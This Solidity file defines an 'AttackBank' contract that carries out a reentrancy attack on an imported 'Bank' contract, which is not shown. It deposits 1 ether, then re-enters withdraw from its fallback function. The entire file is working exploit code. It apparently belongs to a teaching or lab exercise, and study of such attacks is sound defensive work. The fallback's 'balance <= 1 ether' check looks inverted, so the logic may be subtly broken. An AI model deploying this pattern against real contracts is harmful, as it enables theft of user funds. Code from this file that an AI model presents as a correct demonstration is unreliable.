// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
import "./Bank.sol";

contract AttackBank {

    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance <= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}